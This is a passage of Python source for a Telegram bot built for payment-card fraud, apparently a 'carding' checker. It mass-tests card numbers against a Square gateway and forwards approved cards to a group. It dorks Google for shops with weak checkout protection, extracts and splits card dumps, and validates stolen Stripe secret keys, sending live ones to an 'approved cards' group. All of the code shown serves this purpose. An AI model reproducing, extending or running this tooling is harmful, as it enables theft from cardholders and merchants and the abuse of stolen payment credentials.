        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"🚀 Starting mass Square Auth check of {len(cards)} cards..."
        status_message = bot.reply_to(message, initial_msg)

        gateway = "Square Auth"
        start_time = time.time()

        def process_cards():
            results = []
            for i, card in enumerate(cards, 1):
                try:
                    result = process_sq_card(card)
                    results.append({
                        'card': card,
                        'status': result['status'],
                        'response': result['response'],
                        'gateway': result.get('gateway', gateway)
                    })

                    # Send approved to group
                    if result["status"].upper() in ["APPROVED", "APPROVED_OTP"]:
                        send_to_group(
                            cc=card,
                            gateway=result["gateway"],
                            response=result["response"],
                            bin_info=get_bin_info(card.split('|')[0][:6]) or {},
                            time_taken=round(time.time() - start_time, 2),
                            user_info=message.from_user
                        )

                except Exception as e:
                    results.append({
                        'card': card,
                        'status': 'ERROR',
                        'response': f'Error: {str(e)}',
                        'gateway': gateway
                    })

                current_time = time.time() - start_time
                progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                                      text=progress_msg, parse_mode='HTML')

            final_time = time.time() - start_time
            final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
            bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                                  text=final_msg, parse_mode='HTML')

        threading.Thread(target=process_cards).start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

#=============================================================================================================================================#
def extract_ccs(text):
    cc_pattern = r'\b(?:\d[ -]*?){13,16}[|:/\- ]\d{1,2}[|:/\- ]\d{2,4}[|:/\- ]\d{3,4}\b'
    matches = re.findall(cc_pattern, text)
    cleaned = []

    for match in matches:
        nums = re.split(r'[|:/\- ]+', match)
        if len(nums) == 4:
            cc, mm, yy, cvv = nums
            if len(yy) == 2:
                yy = "20" + yy
            cleaned.append(f"{cc}|{mm}|{yy}|{cvv}")
    return cleaned

@bot.message_handler(commands=['fl'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.fl'))
def format_list(message):
    target_text = message.text

    # If replying to message, extract that instead
    if message.reply_to_message:
        target_text = message.reply_to_message.text

    ccs = extract_ccs(target_text)
    if not ccs:
        bot.reply_to(message, "❌ No valid CCs found.")
        return

    formatted = "\n".join(ccs)
    count = len(ccs)

    msg = f"✅ Extracted {count} card(s):\n\n<code>{formatted}</code>"
    bot.reply_to(message, msg, parse_mode="HTML")

@bot.message_handler(commands=['dork'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.dork'))
def handle_dork(message):
    user_id = str(message.from_user.id)
    chat_id = str(message.chat.id)

    parts = message.text.split(maxsplit=1)
    if len(parts) != 2:
        bot.reply_to(message, "❌ Usage: /dork <keyword> or .dork <keyword>")
        return

    query = parts[1]
    msg = bot.reply_to(message, "🔍 Dorking... Please wait.")

    # Skip known brands
    skip_domains = [
        "google.com", "facebook.com", "github.com", "paypal.com", "stripe.com", "microsoft.com", "cloudflare.com",
        "razorpay.com", "adyen.com", "paytm.com", "shopify.com", "mozilla.org", "youtube.com", "apple.com",
        "linkedin.com", "amazon.com", "twitter.com", "openai.com", "braintreepayments.com"
    ]

    gateways = [
        "paypal", "stripe", "razorpay", "adyen", "paytm", "checkout.com", "square", "shopify", "braintree",
        "authorize.net", "payu", "worldpay", "mollie", "skrill", "klarna", "paddle", "2checkout", "bluepay",
        "bitpay", "afterpay", "sezzle", "stax", "payoneer", "payza", "paytrace", "payeezy", "cybersource",
        "eway", "chasepaymentech", "magento"
    ]

    card_fields = ["credit card", "card number", "security code", "expiration date", "cvv", "cnn", "cardholder name"]

    def status_icon(b): return "✅" if b else "⛔️"

    def get_cms(text):
        if "magento" in text: return "Magento"
        if "woocommerce" in text: return "WooCommerce"
        if "shopify" in text: return "shopify"
        if "drupal" in text: return "Drupal"
        if "wordpress" in text: return "WordPress"
        return "Unknown"

    def format_result(url, gateways, captcha, cloudflare, graphql, tokens, js_count, secure_type, cms, card_hits):
        return f"""
➤ Site → <code>{url}</code>

🔍 Info:
   └─𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀: {', '.join(gateways) if gateways else '❌'}

🛡️ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆:
   ├─ 𝗖𝗮𝗽𝘁𝗰𝗵𝗮: {status_icon(captcha)}
   ├─ 𝗖𝗹𝗼𝘂𝗱𝗳𝗹𝗮𝗿𝗲: {status_icon(cloudflare)}
   ├─ 𝗚𝗿𝗮𝗽𝗵𝗤𝗟: {status_icon(graphql)}
   ├─ Tokens Found:   {tokens}
   └─ Payment JS Libs:{js_count} found

🛍️ 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺:
   ├─ 𝗖𝗠𝗦: {cms}
   ├─ 2𝗗/𝟯𝗗: {secure_type}
   └─ 𝗖𝗮𝗿𝗱𝘀: {', '.join(card_hits) if card_hits else '❌'}
─────── ⸙ ────────
"""

    try:
        from googlesearch import search
        from fake_useragent import UserAgent
        ua = UserAgent()
        headers = {"User-Agent": ua.random}
    except:
        headers = {"User-Agent": "Mozilla/5.0"}

    found = 0
    output = ""
    try:
        for url in search(query, num_results=50):
            domain = urlparse(url).netloc.replace("www.", "")
            if any(skip in domain for skip in skip_domains):
                continue

            try:
                res = requests.get(url, headers=headers, timeout=10)
                html = res.text.lower()
                soup = BeautifulSoup(res.text, "html.parser")
                scripts = " ".join([s.get_text() for s in soup.find_all("script")])
            except:
                continue

            text = html + scripts
            card_hits = [c for c in card_fields if c in text]
            gws = [g for g in gateways if g in text]
            endpoints = re.findall(r"/(checkout|pay|payment|charge|intent)[^\s\"\'<>]*", text)
            graphql = "graphql" in text
            captcha = bool(re.search(r'captcha|recaptcha|hcaptcha|i am human|cf-chl', text))
            cloudflare = "cloudflare" in res.headers.get("server", "").lower() or "cf-ray" in res.headers
            tokens = len(re.findall(r"(client_secret|access_token|pk_live|pk_test)", text))
            js_libs = len([s for s in soup.find_all("script") if any(g in str(s) for g in gateways)])
            secure_type = "3D Secure" if "3d secure" in text else "Possibly 2D" if "2d secure" in text else "Unknown"
            cms = get_cms(text)

            result = format_result(url, gws, captcha, cloudflare, graphql, tokens, js_libs, secure_type, cms, card_hits)
            output += result
            found += 1
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=output[:4096], parse_mode="HTML")

            if found >= 5:
                break

        if found == 0:
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text="❌ No valid results found.")
    except Exception as e:
        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=f"❌ Error: {e}")

# System monitoring functions
def get_system_info():
    """Get system information"""
    try:
        # CPU usage
        cpu_usage = psutil.cpu_percent(interval=1)
        
        # Memory usage
        memory = psutil.virtual_memory()
        total_memory = round(memory.total / (1024 ** 3), 2)  # GB
        used_memory = round(memory.used / (1024 ** 3), 2)    # GB
        memory_percent = memory.percent
        
        # Disk usage
        disk = psutil.disk_usage('/')
        total_disk = round(disk.total / (1024 ** 3), 2)      # GB
        used_disk = round(disk.used / (1024 ** 3), 2)        # GB
        disk_percent = disk.percent
        
        # System info
        system = platform.system()
        release = platform.release()
        architecture = platform.architecture()[0]
        
        # Boot time
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.now() - boot_time
        uptime_str = str(uptime).split('.')[0]  # Remove microseconds
        
        # Current time (Kolkata timezone)
        kolkata_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        return {
            'cpu_usage': cpu_usage,
            'total_memory': total_memory,
            'used_memory': used_memory,
            'memory_percent': memory_percent,
            'total_disk': total_disk,
            'used_disk': used_disk,
            'disk_percent': disk_percent,
            'system': system,
            'release': release,
            'architecture': architecture,
            'uptime': uptime_str,
            'kolkata_time': kolkata_time
        }
    except Exception as e:
        return {'error': str(e)}

def get_bot_stats():
    """Get bot statistics"""
    try:
        users = load_users()
        total_users = len(users)
        
        # Calculate total checks, approved, declined
        total_checks = 0
        total_approved = 0
        total_declined = 0
        
        for user_id, user_data in users.items():
            total_checks += user_data.get('total_checks', 0)
            total_approved += user_data.get('approved', 0)
            total_declined += user_data.get('declined', 0)
        
        # Calculate active users (users with credits > 0)
        active_users = sum(1 for user_data in users.values() if user_data.get('credits', 0) > 0)
        
        # Calculate today's checks
        today = datetime.now().date()
        today_checks = 0
        today_approved = 0
        
        # This would require storing check timestamps - for now we'll use approximation
        # You might want to enhance your user data structure to store check history
        
        return {
            'total_users': total_users,
            'active_users': active_users,
            'total_checks': total_checks,
            'total_approved': total_approved,
            'total_declined': total_declined,
            'approval_rate': (total_approved / total_checks * 100) if total_checks > 0 else 0
        }
    except Exception as e:
        return {'error': str(e)}

# Handle /stats command (Admin/Owner only)
@bot.message_handler(commands=['stats'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.stats'))
def handle_stats(message):
    user_id = message.from_user.id
    
    # Check if user is owner or admin
    if user_id != OWNER_ID and user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ This command is only available for admins and owner.")
        return
    
    try:
        # Get bot statistics
        bot_stats = get_bot_stats()
        if 'error' in bot_stats:
            bot.reply_to(message, f"❌ Error getting stats: {bot_stats['error']}")
            return
        
        # Get system information
        system_info = get_system_info()
        if 'error' in system_info:
            bot.reply_to(message, f"❌ Error getting system info: {system_info['error']}")
            return
        
        # Format the response
        stats_text = f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ 𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐢𝐬𝐭𝐢𝐜𝐬 </a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐓𝐨𝐭𝐚𝐥 𝐔𝐬𝐞𝐫𝐬 ➳ <i>{bot_stats['total_users']}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐀𝐜𝐭𝐢𝐯𝐞 𝐔𝐬𝐞𝐫𝐬 ➳ <i>{bot_stats['active_users']}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐬 ➳ <i>{bot_stats['total_checks']}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ➳ <i>{bot_stats['total_approved']}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ➳ <i>{bot_stats['total_declined']}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐚𝐥 𝐑𝐚𝐭𝐞 ➳ <i>{bot_stats['approval_rate']:.2f}%</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐒𝐲𝐬𝐭𝐞𝐦 ➳ <i>{system_info['system']} {system_info['release']} [{system_info['architecture']}]</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐏𝐔 𝐔𝐬𝐚𝐠𝐞 ➳ <i>{system_info['cpu_usage']}%</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐑𝐀𝐌 𝐔𝐬𝐚𝐠𝐞 ➳ <i>{system_info['used_memory']}GB / {system_info['total_memory']}GB ({system_info['memory_percent']}%)</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐃𝐢𝐬𝐤 𝐔𝐬𝐚𝐠𝐞 ➳ <i>{system_info['used_disk']}GB / {system_info['total_disk']}GB ({system_info['disk_percent']}%)</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐔𝐩𝐭𝐢𝐦𝐞 ➳ <i>{system_info['uptime']}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐓𝐢𝐦𝐞 ➳ <i>{system_info['kolkata_time']}</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐁𝐨𝐭 𝐁𝐲 ➳ <a href='https://t.me/stormxvup'>⏤‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲</a>
"""
        
        bot.reply_to(message, stats_text, parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error generating statistics: {str(e)}")

# Handle /broad command (Admin/Owner only)
@bot.message_handler(commands=['broad'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.broad'))
def handle_broadcast(message):
    user_id = message.from_user.id
    
    # Check if user is owner or admin
    if user_id != OWNER_ID and user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ This command is only available for admins and owner.")
        return
    
    if not message.reply_to_message:
        bot.reply_to(message, "❌ Please reply to the message you want to broadcast.")
        return
    
    msg = message.reply_to_message
    
    # Get all users from user data
    users = load_users()
    all_users = list(users.keys())  # Get all user IDs
    
    # Get all groups from group data
    groups = load_groups()
    all_groups = groups  # This should be a list of group IDs
    
    # Combine all targets
    targets = []
    
    # Add users (convert to integers)
    for user_id in all_users:
        try:
            targets.append(int(user_id))
        except:
            pass
    
    # Add groups
    targets.extend(all_groups)
    
    total = len(targets)
    success = 0
    failed = 0
    errors = 0
    start_time = time.time()
    
    # Initial status message
    status_text = f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ 📢 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭𝐢𝐧𝐠 𝐌𝐞𝐬𝐬𝐚𝐠𝐞</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐓𝐨𝐭𝐚𝐥 ➳ <code>{total}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥 ➳ <code>{success}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐅𝐚𝐢𝐥𝐞𝐝 ➳ <code>{failed}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐄𝐫𝐫𝐨𝐫𝐬 ➳ <code>{errors}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐓𝐢𝐦𝐞 ➳ 0.00 𝐒

<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠...
"""
    status_msg = bot.reply_to(message, status_text, parse_mode='HTML')
    
    # Function to update status
    def update_status():
        elapsed = time.time() - start_time
        updated_status = f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ 📢 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐓𝐨𝐭𝐚𝐥 ➳ <code>{total}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥 ➳ <code>{success}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐅𝐚𝐢𝐥𝐞𝐝 ➳ <code>{failed}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐄𝐫𝐫𝐨𝐫𝐬 ➳ <code>{errors}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐓𝐢𝐦𝐞 ➳ <code>{elapsed:.2f} 𝐒</code>

<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬 ➳ <code>{success + failed + errors}/{total}</code>
"""
        try:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                text=updated_status,
                parse_mode='HTML'
            )
        except:
            pass
    
    # Broadcast to all targets
    for idx, target_id in enumerate(targets):
        try:
            # Handle different message types
            if msg.text:
                bot.send_message(target_id, msg.text, parse_mode='HTML')
            elif msg.caption and (msg.photo or msg.video or msg.document or msg.audio):
                caption = msg.caption
                if msg.photo:
                    bot.send_photo(target_id, msg.photo[-1].file_id, caption=caption, parse_mode='HTML')
                elif msg.video:
                    bot.send_video(target_id, msg.video.file_id, caption=caption, parse_mode='HTML')
                elif msg.document:
                    bot.send_document(target_id, msg.document.file_id, caption=caption, parse_mode='HTML')
                elif msg.audio:
                    bot.send_audio(target_id, msg.audio.file_id, caption=caption, parse_mode='HTML')
            elif msg.photo:
                bot.send_photo(target_id, msg.photo[-1].file_id, parse_mode='HTML')
            elif msg.video:
                bot.send_video(target_id, msg.video.file_id, parse_mode='HTML')
            elif msg.document:
                bot.send_document(target_id, msg.document.file_id, parse_mode='HTML')
            elif msg.sticker:
                bot.send_sticker(target_id, msg.sticker.file_id)
            elif msg.voice:
                bot.send_voice(target_id, msg.voice.file_id)
            elif msg.audio:
                bot.send_audio(target_id, msg.audio.file_id, parse_mode='HTML')
            else:
                # If we can't determine the message type, send as text
                try:
                    bot.send_message(target_id, "📢 Broadcast message", parse_mode='HTML')
                    if msg.text:
                        bot.send_message(target_id, msg.text, parse_mode='HTML')
                except:
                    errors += 1
                    continue
            
            success += 1
            
        except telebot.apihelper.ApiTelegramException as e:
            error_msg = str(e).lower()
            if any(x in error_msg for x in ['chat not found', 'bot was blocked', 'user is deactivated', 'chat not exist']):
                # These are expected failures - user blocked bot, chat doesn't exist, etc.
                failed += 1
            else:
                # Other API errors
                print(f"API Error sending to {target_id}: {e}")
                errors += 1
                
        except Exception as e:
            print(f"Error sending to {target_id}: {e}")
            errors += 1
        
        # Update status every 5 sends or at the end
        if (idx + 1) % 5 == 0 or (idx + 1) == total:
            update_status()
            time.sleep(0.1)  # Small delay to avoid rate limiting
    
    # Final status update
    update_status()
    
    # Send completion message
    elapsed = time.time() - start_time
    completion_text = f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ ✅ 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐓𝐨𝐭𝐚𝐥 𝐓𝐚𝐫𝐠𝐞𝐭𝐬 ➳ <code>{total}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 ➳ <code>{success}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐅𝐚𝐢𝐥𝐞𝐝 ➳ <code>{failed}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐄𝐫𝐫𝐨𝐫𝐬 ➳ <code>{errors}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞 ➳ <code>{(success/total*100):.1f}%</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐓𝐨𝐭𝐚𝐥 𝐓𝐢𝐦𝐞 ➳ <code>{elapsed:.2f} 𝐒</code>

<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐁𝐲 ➳ <a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>
"""
    
    bot.send_message(
        chat_id=message.chat.id,
        text=completion_text,
        parse_mode='HTML',
        reply_to_message_id=message.message_id
    )

# Handle /ping command
@bot.message_handler(commands=['ping'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.ping'))
def handle_ping(message):
    try:
        # Calculate bot response time
        start_time = time.time()
        msg = bot.reply_to(message, "🏓 Pinging...")
        end_time = time.time()
        ping_time = round((end_time - start_time) * 1000, 2)  # Convert to milliseconds
        
        # Get system information
        system_info = get_system_info()
        if 'error' in system_info:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text=f"❌ Error: {system_info['error']}"
            )
            return
        
        # Format the response
        ping_text = f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ 𝐒𝐲𝐬𝐭𝐞𝐦 𝐒𝐭𝐚𝐭𝐮𝐬 </a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐏𝐢𝐧𝐠 ➳ <i>{ping_time}ms</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐒𝐲𝐬𝐭𝐞𝐦 ➳ <i>{system_info['system']} {system_info['release']}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐀𝐫𝐜𝐡𝐢𝐭𝐞𝐜𝐭𝐮𝐫𝐞 ➳ <i>{system_info['architecture']}</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐏𝐔 𝐔𝐬𝐚𝐠𝐞 ➳ <i>{system_info['cpu_usage']}%</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐑𝐀𝐌 𝐔𝐬𝐚𝐠𝐞 ➳ <i>{system_info['used_memory']}GB / {system_info['total_memory']}GB ({system_info['memory_percent']}%)</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐃𝐢𝐬𝐤 𝐔𝐬𝐚𝐠𝐞 ➳ <i>{system_info['used_disk']}GB / {system_info['total_disk']}GB ({system_info['disk_percent']}%)</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐔𝐩𝐭𝐢𝐦𝐞 ➳ <i>{system_info['uptime']}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐓𝐢𝐦𝐞 ➳ <i>{system_info['kolkata_time']}</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐁𝐨𝐭 𝐁𝐲 ➳ <a href='https://t.me/stormxvup'>⏤‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲</a>
"""
        
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=ping_text,
            parse_mode='HTML'
        )
        
    except Exception as e:
        try:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text=f"❌ Error: {str(e)}"
            )
        except:
            bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['open'])
def open_txt_file(message):
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "❌ Please reply to a text file.")
        return

    try:
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        text_content = downloaded_file.decode('utf-8')

        # Extract CCs
        ccs = re.findall(r'\d{12,19}[\|\:\/\s]\d{1,2}[\|\:\/\s]\d{2,4}[\|\:\/\s]\d{3,4}', text_content)
        if not ccs:
            bot.reply_to(message, "❌ No CCs found in this file.")
            return

        first_50 = ccs[:50]
        formatted = "\n".join(cc.replace(" ", "|").replace("/", "|").replace(":", "|") for cc in first_50)

        bot.send_message(message.chat.id, f"✅ Found {len(ccs)} CCs.\n\nHere are the first {len(first_50)}:\n<code>{formatted}</code>", parse_mode='HTML')

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['split'])
def split_txt_file(message):
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "❌ Please reply to a text file.")
        return

    try:
        args = message.text.split()
        if len(args) < 2 or not args[1].isdigit():
            bot.reply_to(message, "❌ Provide the number of parts. Example: /split 5")
            return

        parts = int(args[1])
        if parts <= 0:
            bot.reply_to(message, "❌ Number of parts must be greater than 0.")
            return
        if parts > 100:
            bot.reply_to(message, "❌ Maximum allowed parts is 100.")
            return

        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        text_content = downloaded_file.decode('utf-8')

        # Extract CCs
        ccs = re.findall(r'\d{12,19}[\|\:\/\s]\d{1,2}[\|\:\/\s]\d{2,4}[\|\:\/\s]\d{3,4}', text_content)
        if not ccs:
            bot.reply_to(message, "❌ No CCs found in this file.")
            return

        chunk_size = (len(ccs) + parts - 1) // parts
        chunks = [ccs[i:i+chunk_size] for i in range(0, len(ccs), chunk_size)]

        for idx, chunk in enumerate(chunks):
            chunk_text = "\n".join(cc.replace(" ", "|").replace("/", "|").replace(":", "|") for cc in chunk)
            output = io.BytesIO(chunk_text.encode('utf-8'))
            output.name = f'part_{idx+1}.txt'
            bot.send_document(message.chat.id, output)

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Format Stripe Key result
def stripe_key_format(key, mode, account_info):
    result = f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ 𝐒𝐭𝐫𝐢𝐩𝐞 𝐊𝐞𝐲 𝐂𝐡𝐞𝐜𝐤</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐊𝐞𝐲 ⌁ <code>{key}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐌𝐨𝐝𝐞 ⌁ <i>{mode}</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐃 ⌁ {account_info.get("id", "N/A")}
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐁𝐮𝐬𝐢𝐧𝐞𝐬𝐬 𝐍𝐚𝐦𝐞 ⌁ {account_info.get("business_profile", {}).get("name", "N/A")}
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐄𝐦𝐚𝐢𝐥 ⌁ {account_info.get("email", "N/A")}
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {account_info.get("country", "N/A")}
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐁𝐮𝐬𝐢𝐧𝐞𝐬𝐬 𝐔𝐑𝐋 ⌁ {account_info.get("business_profile", {}).get("url", "N/A")}
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>"""
    return result

# Handle /sk command
@bot.message_handler(commands=['sk'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sk'))
def handle_sk(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "❌ Please provide a Stripe Key. Format: `.sk <key>`")
        return

    stripe_key = command_parts[1].strip()
    mention = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
    status_message = bot.reply_to(message, f"🔍 Checking Stripe Key...", parse_mode='HTML')

    try:
        import stripe
        stripe.api_key = stripe_key
        account = stripe.Account.retrieve()

        mode = "Live" if not stripe_key.startswith("sk_test") else "Test"

        response_text = stripe_key_format(stripe_key, mode, account)

        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=response_text,
            parse_mode='HTML'
        )

        # Send live keys to approved cards group
        if mode == "Live":
            try:
                bot.send_message(
                    chat_id=APPROVED_CARDS_GROUP_ID,
                    text=response_text,
                    parse_mode='HTML'
                )
            except Exception as e:
                print(f"Failed to send to group: {e}")

    except Exception as e:
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=f"❌ Invalid key or error: {str(e)}",
            parse_mode='HTML'
        )


# Handle /msk command
@bot.message_handler(commands=['msk'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msk'))
def handle_msk(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        keys_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            keys_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            keys_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide keys after command or reply to a message containing keys.")
            return

        keys = [k.strip() for k in keys_text.split() if k.strip()]
        if not keys:
            bot.reply_to(message, "❌ No valid keys found.")
            return

        if len(keys) > MAX_MASS_CHECK:
            keys = keys[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} keys allowed. Checking first {MAX_MASS_CHECK} keys only.")

        if not use_credits(user_id, len(keys)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        # Send initial message once
        initial_msg = f"🚀 Starting mass Stripe Key check of {len(keys)} keys...\nProcessing..."
        status_message = bot.reply_to(message, initial_msg)

        start_time = time.time()

        def process_keys():
            results_text = ""  # accumulate results here

            for i, key in enumerate(keys, 1):
                try:
                    import stripe
                    stripe.api_key = key
                    account = stripe.Account.retrieve()
                    mode = "Live" if not key.startswith("sk_test") else "Test"
                    formatted_response = stripe_key_format(key, mode, account)

                    results_text += f"{formatted_response}\n\n"

                    # Send live keys to approved cards group
                    if mode == "Live":
